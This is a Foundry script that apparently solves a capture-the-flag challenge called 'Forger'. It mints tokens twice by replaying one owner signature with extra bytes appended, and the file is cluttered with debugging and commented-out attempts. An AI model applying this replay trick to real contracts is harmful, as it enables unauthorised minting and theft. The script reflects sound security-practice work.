// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Script, console} from "forge-std/Script.sol";
import { Forger } from "../src/Forger.sol";
import { ECDSA } from "openzeppelin-contracts/contracts/utils/cryptography/ECDSA.sol";

contract ForgerSolver is Script {

	Forger public instance = new Forger();

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run() external {
		vm.startBroadcast(prv);

		bytes memory signature = hex"1c";

		signature = bytes.concat(bytes32(0), bytes32(uint256(0x01)), bytes1(0x1b));

		address receiver = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
		uint256 amount = 100 ether;
		bytes32 salt = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
		uint256 deadline = 115792089237316195423570985008687907853269984665640564039457584007913129639935;





        bytes32 z1 = keccak256(abi.encode(
            receiver,
            amount,
            salt,
            deadline
        ));

	// (uint8 v, bytes32 r, bytes32 s) = vm.sign(prv, z1);
	// bytes memory signature1 = bytes.concat(r, s, bytes1(v));
	// console.logBytes(signature1);

        

	console.logBytes32(keccak256(abi.encode(
            address(uint160(receiver) >> 8),
            amount >> 8 | (0x3e << 159),
            bytes32(uint256(salt) >> 8),
            bytes32(bytes32(deadline >> 16 | (0x6d << 159))),
	    bytes1(0xff)
        )));

	console.logBytes32(keccak256(abi.encode(
            address(uint160(receiver) << 0),
            amount << 0,
            bytes32(uint256(salt) << 0),
            bytes32(bytes32(deadline))
        )));


		bytes32 r = 0xf73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809;
		bytes32 s = 0x402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb;
		uint8 v = 0x1c;
		console.log(ecrecover(z1, 1, r, s));
		// instance.createNewTokensFromOwnerSignature();

		// 0x0000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e
		//   0000000000000000000000000000000000000000000000056bc75e2d63100000
		//   044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d
		//   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff



	//bytes32 z2 = keccak256(abi.encode(
        //    me,
        //    1000 ether,
        //    salt,
        //    deadline
        //));

	//	bytes32 r = 0xf73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809;
	//	bytes32 s = 0x402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb;
	//	uint8 v = 0x1c;


	//	console.logBytes32(z2);
	//	bytes32 r2 = r;
	//	bytes32 s2 = s;
	//	uint8 v2 = 0x1c;


	//	console.log(ecrecover(z2, v2, s2, r2));


		instance.createNewTokensFromOwnerSignature(
			bytes.concat(r, s, bytes1(v)),
			receiver,
			100 ether,
			salt,
			deadline	
		);

		instance.createNewTokensFromOwnerSignature(
			bytes.concat(r, s, bytes1(v), bytes1(0x00), bytes1(v)),
			receiver,
			100 ether,
			salt,
			deadline	
		);
		vm.stopBroadcast();
	}

}

